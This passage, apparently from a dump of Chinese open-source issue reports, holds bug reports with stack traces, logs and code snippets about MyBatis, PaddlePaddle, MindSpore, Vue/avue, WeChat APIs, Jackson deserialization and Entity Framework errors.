org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:198) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.dao.support.PersistenceExceptionTranslationInterceptor.invoke(PersistenceExceptionTranslationInterceptor.java:139) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:212) at com.sun.proxy.$Proxy150.getDataDictInfoPageList(Unknown Source) at com.nrec.pcs9000.app.service.impl.DataDictInfoServiceImpl.getDataDictInfoPageList(DataDictInfoServiceImpl.java:51) at com.nrec.pcs9000.app.service.impl.DataDictInfoServiceImpl$$FastClassBySpringCGLIB$$a90902d5.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:685) at com.nrec.pcs9000.app.service.impl.DataDictInfoServiceImpl$$EnhancerBySpringCGLIB$$7ef8624e.getDataDictInfoPageList(&lt;generated&gt;) at com.nrec.pcs9000.app.controller.DataDictInfoController.getDataDictInfoPageList(DataDictInfoController.java:62) at com.nrec.pcs9000.app.controller.DataDictInfoController$$FastClassBySpringCGLIB$$4293c539.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) at org.springframework.aop.framework.adapter.MethodBeforeAdviceInterceptor.invoke(MethodBeforeAdviceInterceptor.java:56) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) at org.springframework.aop.framework.adapter.MethodBeforeAdviceInterceptor.invoke(MethodBeforeAdviceInterceptor.java:56) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) at com.nrec.pcs9000.app.controller.DataDictInfoController$$EnhancerBySpringCGLIB$$4e2d1573.getDataDictInfoPageList(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:879) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:660) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:741) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:124) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:109) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:367) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1639) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:745) Caused by: org.apache.ibatis.binding.BindingException: Parameter 'ew' not found. Available parameters are [ews, param1] at org.apache.ibatis.binding.MapperMethod$ParamMap.get(MapperMethod.java:212) at org.apache.ibatis.reflection.wrapper.MapWrapper.get(MapWrapper.java:45) at org.apache.ibatis.reflection.MetaObject.getValue(MetaObject.java:122) at org.apache.ibatis.reflection.MetaObject.metaObjectForProperty(MetaObject.java:145) at org.apache.ibatis.reflection.MetaObject.getValue(MetaObject.java:115) at com.baomidou.mybatisplus.core.executor.AbstractBaseExecutor.createCacheKey(AbstractBaseExecutor.java:81) at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:135) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:147) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:140) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:426) ... 96 more"
某些复杂场景下需要动态拼凑SQL语句  嵌入参数表达式无法支持,"下面的脚本是根据用户自定义的查询方案，拼凑SQL语句 pub_case_cond表每行代表一个针对多个关键字的查询条件 条件可能是has-all：包含所有关键字，has-any：包含任意关键字 pub_case_label表是pub_case_cond的子表，包含若干关键字 在这种高度动态的场景下 嵌入表达式的延迟解析不起作用 只能走静态化转义 比如 如果写成 是无法解析的，因为x不是全局变量，x的语义一直在变化，除非有扩展方法支持就地解析/即时解析   <code>: var sql = """"""select t.* from xxx t where 1=1""""""; var conds = db.select(""""""select * from pub_case_cond where case_id=#{r.id} and enable_flag=1 order by order_no asc""""""); var labels = db.select(""""""select * from pub_case_label where case_id=#{r.id)""""""); var helper = StringHelper.INSTANCE; conds.each(it =&gt; { var lbs = labels.filter( x =&gt; x.condId == it.id ); if (lbs == null || lbs.size() &lt;= 0) { return; } if (it.condFlag == 'has-all') { lbs.each(x =&gt; { sql.append("""""" and locate('"""""" + helper.escape_mysql_string(x.label) + """"""', t.text)&gt;0 \r\n""""""); }); } else if (it.condFlag == 'has-any') { sql.append(""and (""); var i = 0; lbs.each(x =&gt; { if (i == 0) { sql.append(""""""locate('"""""" + helper.escape_mysql_string(x.label) + """"""', t.text)&gt;0""""""); } else { sql.append("""""" or locate('"""""" + helper.escape_mysql_string(x.label) + """"""', t.text)&gt;0""""""); } i = i + 1; }); sql.append("") \r\n""); lbs.each(x =&gt; {sql.append("""""" and locate('"""""" + helper.escape_mysql_string(x.label) + """"""', t.text)&gt;0 \r\n""""""); }); lbs.each(x =&gt; {sql.append("""""" and locate(#{x.label}, t.text)&gt;0 \r\n""""""); });"
Caffe转Fluid报错,"我是使用这些模型的，其中测试的是ResNet101，根据官方的教程就会报以下错误： 然后我把改成，上面的错误就没有了，但是在执行以下这一步的时候就报错了   <code>: root@test:/home/test/paddlepaddle/models/fluid/image_classification/caffe2fluid# python convert.py ResNet-101-deploy.prototxt --caffemodel ResNet-101-model.caffemodel --data-output-path ResNet101.npy --code-output-path ResNet101.py register layer[Axpy] register layer[Flatten] register layer[ArgMax] register layer[Reshape] register layer[ROIPooling] register layer[PriorBox] register layer[Permute] register layer[DetectionOutput] register layer[Normalize] register layer[Select] Traceback (most recent call last): File ""convert.py"", line 80, in &lt;module&gt; ret = main() File ""convert.py"", line 76, in main args.code_output_path, args.phase) File ""convert.py"", line 35, in convert transformer = Transformer(def_path, caffemodel_path, phase=phase) File ""/home/test/paddlepaddle/models/fluid/image_classification/caffe2fluid/kaffe/paddle/transformer.py"", line 293, in __init__ self.load(def_path, data_path, phase) File ""/home/test/paddlepaddle/models/fluid/image_classification/caffe2fluid/kaffe/paddle/transformer.py"", line 299, in load graph = GraphBuilder(def_path, phase).build() File ""/home/test/paddlepaddle/models/fluid/image_classification/caffe2fluid/kaffe/graph.py"", line 177, in __init__ self.load() File ""/home/test/paddlepaddle/models/fluid/image_classification/caffe2fluid/kaffe/graph.py"", line 181, in load self.params = get_caffe_resolver().NetParameter() File ""/home/test/paddlepaddle/models/fluid/image_classification/caffe2fluid/kaffe/caffe/resolver.py"", line 43, in get_caffe_resolver SHARED_CAFFE_RESOLVER = CaffeResolver() File ""/home/test/paddlepaddle/models/fluid/image_classification/caffe2fluid/kaffe/caffe/resolver.py"", line 18, in __init__ self.import_caffe() File ""/home/test/paddlepaddle/models/fluid/image_classification/caffe2fluid/kaffe/caffe/resolver.py"", line 28, in import_caffe self.caffepb = import_caffepb() File ""/home/test/paddlepaddle/models/fluid/image_classification/caffe2fluid/kaffe/caffe/resolver.py"", line 12, in import_caffepb import caffe_pb2 ImportError: No module named caffe_pb2 caffepb.py caffe_pb2.py root@test:/home/test/paddlepaddle/models/fluid/image_classification/caffe2fluid# python ResNet101.py ResNet101.npy ./fluid File ""ResNet101.py"", line 467 class ResNet-101(Network): ^ SyntaxError: invalid syntax"
usability: add some label for usability problem Analysis,RFC 为更好分析和跟进易用性问题，近期正制作易用性问题看板 为此需新增三类标签（用户类别，阶段类别，专项类别） 初步分析新增的标签对应的英文如下： 用户类别 标签名字 高校 users/college 行业客户 users/industry 众智 users/crowd-contrib 个人 users/individual 阶段名称 标签名字 环境准备 kind/build-install 代码编写 kind/coding 功能调试 kind/function 精度调试 kind/precision 性能调试 kind/performance 部署应用 kind/deployment 各易用性专项名称 标签名字 精度/性能 or is okay 版本升级解耦 kind/compatibility 故障恢复与报错 kind/DFX 集群调优 kind/cluster-debug CI看护 kind/ci   <code>: kind/precision kind/performance
[ST][MS][Pynative]Constant1d算子用例在windows环境中Pynative模式下执行失败,"Constant1d算子用例在windows环境中Pynative模式下执行失败 / 硬件环境: /device /CPU/ : -- MindSpore version :20221228/master_20221228121531_47be05164f8 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative test_ms_ops_constantpad1d_func_input_2d.py source ~/solution_test/env_set.source -e windows cd solution_test/cases/04operator/12nn/constantpad1d/ pytest -s test_ms_ops_constantpad1d_func.py::Test_ms_ops_constantpad1d_func::test_ms_ops_constantpad1d_func_input_2d 用例执行正常 责任人 罗超 00806253   <code>: ================================== FAILURES =================================== ___ Test_ms_ops_constantpad1d_func.test_ms_ops_constantpad1d_func_input_2d ____ self = &lt;test_ms_ops_constantpad1d_func.Test_ms_ops_constantpad1d_func object at 0x0000009B130EEA08&gt; @pytest.mark.timeout(300) @pytest.mark.Function @pytest.mark.level0 def test_ms_ops_constantpad1d_func_input_2d(self): """""" TestCase_Name:ConstantPad1d??????????, input_x shape (1, 2) padding (1, 1) precision with pytorch TestCase_executeParam:env_Ascend,env_Gpu,env_Cpu; TestCase_customField1:Ops_Case,Pynative_Case;TestCase_stage:Iota """""" assert self.init_success_flg self.ms_log.info(""ConstantPad1d operator test, input_x shape (1, 2) padding (1, 1), value=0.5"") fact = ConstantPad1dFactory(input_shape=(1, 2), padding=(1, 1), value=0.5) self.ms_log.step(""Step1: Start operator accuracy compare."") assert fact.forward_cmp() self.ms_log.step(""Step2: Start grad operator accuracy compare."") &gt; assert fact.grad_cmp() test_ms_ops_constantpad1d_func.py:85: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ..\..\..\..\common\ms_aw\operator\nn\constantpad1d_ops.py:93: in grad_cmp input_grad_mindspore = self.grad_mindspore_impl() ..\..\..\..\common\ms_aw\operator\nn\constantpad1d_ops.py:72: in grad_mindspore_impl input_grad = grad_net(input_ms, output_grad) C:\ProgramData\miniconda3\envs\ci\lib\site-packages\mindspore\nn\cell.py:652: in __call__ raise err C:\ProgramData\miniconda3\envs\ci\lib\site-packages\mindspore\nn\cell.py:648: in __call__ output = self._run_construct(args, kwargs) C:\ProgramData\miniconda3\envs\ci\lib\site-packages\mindspore\nn\cell.py:414: in _run_construct output = self.construct(*cast_inputs, **kwargs) ..\..\..\..\common\utils\operator_helper.py:49: in construct return self.grad(self.network)(*inputs) C:\ProgramData\miniconda3\envs\ci\lib\site-packages\mindspore\ops\composite\base.py:377: in after_grad return grad_(fn)(*args, **kwargs) C:\ProgramData\miniconda3\envs\ci\lib\site-packages\mindspore\common\api.py:101: in wrapper results = fn(*arg, **kwargs) C:\ProgramData\miniconda3\envs\ci\lib\site-packages\mindspore\ops\composite\base.py:366: in after_grad out = _pynative_executor() _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._PyNativeExecutor object at 0x0000009B738B6948&gt; def __call__(self): """""" PyNative executor run grad graph. Return: The return object after running grad graph. """""" &gt; return self._executor() E TypeError: bprop() missing 2 required positional arguments: 'out' and 'dout' C:\ProgramData\miniconda3\envs\ci\lib\site-packages\mindspore\common\api.py:986: TypeError ----------------------------- Captured log setup ------------------------------ INFO test_ms_ops_constantpad1d_func_input_2d2LimyRfT:local_cmd_actuator.py:37 Exec [hostname] success INFO test_ms_ops_constantpad1d_func_input_2d2LimyRfT:base.py:93 The environment hostname: [WIN-9C7EU5H11I1], Windows: Windows_X86+Windows INFO test_ms_ops_constantpad1d_func_input_2d2LimyRfT:base.py:95 The case_run_type: daily, the device_id: 0, the device_target: CPU, task_id: None, execute_mode: PYNATIVE_MODE INFO test_ms_ops_constantpad1d_func_input_2d2LimyRfT:base.py:105 The base setup is running INFO test_ms_ops_constantpad1d_func_input_2d2LimyRfT:test_ms_ops_constantpad1d_func.py:50 The case setup success ------------------------------ Captured log call ------------------------------ INFO test_ms_ops_constantpad1d_func_input_2d2LimyRfT:test_ms_ops_constantpad1d_func.py:80 ConstantPad1d operator test, input_x shape (1, 2) padding (1, 1), value=0.5 INFO rootWmUQAMCG:base_operator.py:103 remove ir file: C:/Users/jenkins0/csj/solution_test/cases/04operator/12nn/constantpad1d/test_ms_ops_constantpad1d_func_input_2d_pynative_mode_ir success. INFO rootWmUQAMCG:base_operator.py:106 Operator init success, set seed: 256831659, execute_mode: pynative_mode step test_ms_ops_constantpad1d_func_input_2d2LimyRfT:test_ms_ops_constantpad1d_func.py:82 Step1: Start operator accuracy compare. step test_ms_ops_constantpad1d_func_input_2d2LimyRfT:test_ms_ops_constantpad1d_func.py:84 Step2: Start grad operator accuracy compare. ---------------------------- Captured log teardown ---------------------------- INFO test_ms_ops_constantpad1d_func_input_2d2LimyRfT:test_ms_ops_constantpad1d_func.py:278 The case teardown is running INFO test_ms_ops_constantpad1d_func_input_2d2LimyRfT:process_handle.py:214 After checking, the process containing the keyword python is as follows INFO test_ms_ops_constantpad1d_func_input_2d2LimyRfT:process_handle.py:215 INFO test_ms_ops_constantpad1d_func_input_2d2LimyRfT:process_handle.py:148 No residual processes need to be cleaned. INFO test_ms_ops_constantpad1d_func_input_2d2LimyRfT:base.py:115 The base teardown is running =========================== short test summary info =========================== FAILED test_ms_ops_constantpad1d_func.py::Test_ms_ops_constantpad1d_func::test_ms_ops_constantpad1d_func_input_2d ============================== 1 failed in 7.39s =============================="
LSTM 输出维度错误,"paddle API文档中关于fluid.layers.lstm的说明有误： 输出的维度信息和文档不符：rnn_out：LSTM hidden的输出结果的Tensor，数据类型与input一致，维度为 [seq_len,batch_size,hidden_size]，运行示例代码，得到的是[batch_size, seq_len, hidden_size] 代码示例有问题：layt_c.shape 应该为last_c.shape 以下是根据API文档中的示例所写的测试代码   <code>: import paddle.fluid.layers as layers emb_dim = 256 vocab_size = 10000 data = fluid.layers.data(name='x', shape=[-1, 100, 1], dtype='int64') emb = fluid.layers.embedding(input=data, size=[vocab_size, emb_dim], is_sparse=True) batch_size = 20 max_len = 100 dropout_prob = 0.2 seq_len = 100 hidden_size = 150 num_layers = 1 init_h = layers.fill_constant([num_layers, batch_size, hidden_size], 'float32', 0.0) init_c = layers.fill_constant([num_layers, batch_size, hidden_size], 'float32', 0.0) print emb.shape # (-1L, 100L, 256L) rnn_out, last_h, last_c = layers.lstm(emb, init_h, init_c, max_len, hidden_size, num_layers, dropout_prob=dropout_prob) print rnn_out.shape # (-1, 100, 150) print last_h.shape # (1, 20, 150) print last_c.shape # (1, 20, 150)```"
参数校验，使用默认规则不起效果,"不为空能正常触发，后续的校验手机是否正确这个触发不了。还是我用的方式不对吗？   <code>: // 表单校验 rules: { phonenumber: [ { required: true, message: ""手机号码电话不能为空"", trigger: ""blur"" }, { isPhone: true, message: ""必须输入正确的手机号码"", trigger: ""blur""}, ], }"
升级2.5.3版本之后option从后端接口获取crud出现列表展示字段显示为空,"目前发现只是列表展示有问题，新增和编辑都正常 代码如下：   <code>: &lt;template&gt; &lt;basic-container&gt; &lt;avue-crud :data=""data"" :option=""option""&gt;&lt;/avue-crud&gt; &lt;/basic-container&gt; &lt;/template&gt; &lt;script&gt; import ApiBase from '@/api/apiBase' export default { data() { return { masterApi: ApiBase, masterUri: this.$route.path, data: [], page: { pageSize: 10, currentPage: 1, total: 0 }, query: { ordering: '', search: '' }, option:{ title:'表格的标题', page: true, align:'center', menuAlign:'center', column:[] } } }, created() { this.onLoad() }, methods: { getList() { let params = Object.assign(this.page, this.query) this.masterApi.list(this.masterUri, params).then(res =&gt; { this.data = res.results this.page.total = res.count }); }, onLoad() { this.masterApi.getOption(this.masterUri).then(res =&gt; { // this.option.column = [{'label': 'name', 'value': 'name'}, {'label': 'sex', 'value': 'sex'}] this.option = Object.assign(this.option, res.option) this.getList() }) } }, } &lt;/script&gt;"
QrcodeApi中缺少临时二维码QR_STR_SCENE类型的,"这里只有一个 int sceneId的，缺少一个   <code>: public static ApiResult createTemporary(int expireSeconds, int sceneId) { Map&lt;String, Object&gt; params = new HashMap&lt;String, Object&gt;(); params.put(""expire_seconds"", expireSeconds); params.put(""action_name"", ""QR_SCENE""); Map&lt;String, Object&gt; actionInfo = new HashMap&lt;String, Object&gt;(); Map&lt;String, Object&gt; scene = new HashMap&lt;String, Object&gt;(); scene.put(""scene_id"", sceneId); actionInfo.put(""scene"", scene); params.put(""action_info"", actionInfo); return create(JsonUtils.toJson(params)); } createTemporary(int expireSeconds, String sceneStr)"
Page Post 请求反序列化报错,"当前使用版本 3.0-RC1 Post 请求 Json 结构体 请求参数 body: {} API Controller 该问题由 Page 的重构方法引起 分别为 Failed to evaluate Jackson deserialization for type [[simple type, class com.baomidou.mybatisplus.extension.plugins.pagination.Page]]: java.lang.ArrayStoreException: sun.reflect.annotation.TypeNotPresentExceptionProxy 解决方案 1 自己实现 com.baomidou.mybatisplus.core.metadata.IPage 解决方案 2 在类未加载之前处理 <del>此为临时解决方案</del>   <code>: import com.baomidou.mybatisplus.extension.plugins.pagination.Page; @RestController @PostMapping(""method"") public ResponseEntity method(@RequestBody Page page) { return new ResponseEntity(""pass"", HttpStatus.OK); } public IPage&lt;T&gt; setAscs(String... ascs) { this.ascs = ascs; return this; } public IPage&lt;T&gt; setDescs(String... descs) { this.descs = descs; return this; } ClassPool classPool = ClassPool.getDefault(); ClassClassPath classPath = new ClassClassPath(this.getClass()); classPool.insertClassPath(classPath); CtClass ctClass = classPool.get(""com.baomidou.mybatisplus.extension.plugins.pagination.Page""); ctClass.defrost(); ClassFile classFile = ctClass.getClassFile(); ConstPool constPool = classFile.getConstPool(); Annotation annotation = new Annotation(""com.fasterxml.jackson.annotation.JsonIgnore"", constPool); List&lt;MethodInfo&gt; methodInfos = classFile.getMethods(); for (MethodInfo methodInfo : methodInfos) { if (methodInfo.getName().equals(""setAscs"") || methodInfo.getName().equals(""setDescs"")) { ConstPool methodConstPool = methodInfo.getConstPool(); AnnotationsAttribute annotationsAttribute = new AnnotationsAttribute(methodConstPool, AnnotationsAttribute.visibleTag); annotationsAttribute.setAnnotation(annotation); methodInfo.addAttribute(annotationsAttribute); } } ctClass.toClass();"
[问题] Task.Run操作数据库问题,"Furion 版本号 1.17.3 Web 项目类型 WebApi Mvc Razor Pages Blazor Server 代码或代码仓库 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos   <code>: Date：2021-04-08 17:49:06.689 LogLevel：Error Message：An exception occurred w: Cannot access a disposed context instance. A common cause of this error is disposing a context instance that was resolved from dependency injection and then later trying to use the same context instance elsewhere in your application. This may occur if you are calling 'Dispose' on the context instance, or wrapping it in a using statement. If you are using dependency injection, you should let the dependency injection container take care of disposing context instances.hile iterating over the results of a query for context type '""Ocr.EntityFramework.Core.OcrDbContext""'."" """"System.ObjectDisposedException Object name: 'OcrDbContext'. at Microsoft.EntityFrameworkCore.DbContext.CheckDisposed() at Microsoft.EntityFrameworkCore.DbContext.get_DbContextDependencies() at Microsoft.EntityFrameworkCore.DbContext.Microsoft.EntityFrameworkCore.Internal.IDbContextDependencies.get_StateManager() at Microsoft.EntityFrameworkCore.Query.QueryContext.InitializeStateManager(Boolean standAlone) at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerable`1.AsyncEnumerator.InitializeReaderAsync(DbContext _, Boolean result, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.SqlServer.Storage.Internal.SqlServerExecutionStrategy.ExecuteAsync[TState,TResult](TState state, Func`4 operation, Func`4 verifySucceeded, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerable`1.AsyncEnumerator.MoveNextAsync()""{""EventId"":{""Id"":10100,""Name"":""Microsoft.EntityFrameworkCore.Query.QueryIterationFailed""},""SourceContext"":""Microsoft.EntityFrameworkCore.Query"",""ActionId"":""ce48a151-1940-41e8-abda-900f560f7126"",""ActionName"":""Web.Areas.WAdmin.Controllers.CardController.Info (Ocr.Web)"",""RequestId"":""80000516-0004-eb00-b63f-84710c7967bb"",""RequestPath"":""/Admin/Card/Info""} System.ObjectDisposedException: Cannot access a disposed context instance. A common cause of this error is disposing a context instance that was resolved from dependency injection and then later trying to use the same context instance elsewhere in your application. This may occur if you are calling 'Dispose' on the context instance, or wrapping it in a using statement. If you are using dependency injection, you should let the dependency injection container take care of disposing context instances. Object name: 'OcrDbContext'. at Microsoft.EntityFrameworkCore.DbContext.CheckDisposed() at Microsoft.EntityFrameworkCore.DbContext.get_DbContextDependencies() at Microsoft.EntityFrameworkCore.DbContext.Microsoft.EntityFrameworkCore.Internal.IDbContextDependencies.get_StateManager() at Microsoft.EntityFrameworkCore.Query.QueryContext.InitializeStateManager(Boolean standAlone) at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerable`1.AsyncEnumerator.InitializeReaderAsync(DbContext _, Boolean result, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.SqlServer.Storage.Internal.SqlServerExecutionStrategy.ExecuteAsync[TState,TResult](TState state, Func`4 operation, Func`4 verifySucceeded, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerable`1.AsyncEnumerator.MoveNextAsync() --------------------------------------------------"
[ST][MS][NET][bert-base][gpu 1p]FPS[327] can not reach 361,"bert-base网络选择Lamb优化器，在GPU环境1p训练，性能327/fps达不到361 / 硬件环境: /device GPU : -- MindSpore version :r1.9 commit_id:4030fed4 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220908 MindSpore 版本：编译时间20220914181553 r1.9.0 commit_id:4030fed4 (/): /mode graph test_ms_bert_base_cn_news_train_check_perf_gpu_1p_0002.py cd solution_test/cases/02network/02nlp/bert/train pytest -s test_ms_bert_base_cn_news_train_check_perf_gpu_1p_0002.py 网络训练成功，性能能达到361/fps 走给安正气   <code>: Train epoch time: 122161.276 ms, per step time: 6108.064 ms Train epoch time: 1926.963 ms, per step time: 96.348 ms Train epoch time: 1949.373 ms, per step time: 97.469 ms Train epoch time: 1935.641 ms, per step time: 96.782 ms Train epoch time: 1929.247 ms, per step time: 96.462 ms Train epoch time: 1929.705 ms, per step time: 96.485 ms Train epoch time: 1914.906 ms, per step time: 95.745 ms Train epoch time: 1968.971 ms, per step time: 98.449 ms Train epoch time: 1955.065 ms, per step time: 97.753 ms Train epoch time: 1948.143 ms, per step time: 97.407 ms Train epoch time: 1935.719 ms, per step time: 96.786 ms Train epoch time: 1912.800 ms, per step time: 95.640 ms Train epoch time: 1921.430 ms, per step time: 96.072 ms Train epoch time: 1937.814 ms, per step time: 96.891 ms Train epoch time: 1904.226 ms, per step time: 95.211 ms Train epoch time: 1948.470 ms, per step time: 97.423 ms Train epoch time: 1938.999 ms, per step time: 96.950 ms Train epoch time: 1913.435 ms, per step time: 95.672 ms Train epoch time: 1930.851 ms, per step time: 96.543 ms Train epoch time: 1916.749 ms, per step time: 95.837 ms Train epoch time: 1927.918 ms, per step time: 96.396 ms Train epoch time: 1934.747 ms, per step time: 96.737 ms Train epoch time: 1931.308 ms, per step time: 96.565 ms Train epoch time: 1924.013 ms, per step time: 96.201 ms Train epoch time: 1937.071 ms, per step time: 96.854 ms Train epoch time: 1935.866 ms, per step time: 96.793 ms Train epoch time: 1934.596 ms, per step time: 96.730 ms Train epoch time: 1971.395 ms, per step time: 98.570 ms Train epoch time: 1930.644 ms, per step time: 96.532 ms Train epoch time: 1970.876 ms, per step time: 98.544 ms Train epoch time: 1979.245 ms, per step time: 98.962 ms Train epoch time: 1963.306 ms, per step time: 98.165 ms Train epoch time: 1982.052 ms, per step time: 99.103 ms Train epoch time: 1975.888 ms, per step time: 98.794 ms Train epoch time: 1978.645 ms, per step time: 98.932 ms Train epoch time: 1990.970 ms, per step time: 99.549 ms Train epoch time: 1976.074 ms, per step time: 98.804 ms Train epoch time: 1985.523 ms, per step time: 99.276 ms Train epoch time: 1970.874 ms, per step time: 98.544 ms Train epoch time: 1993.266 ms, per step time: 99.663 ms Train epoch time: 1981.692 ms, per step time: 99.085 ms Train 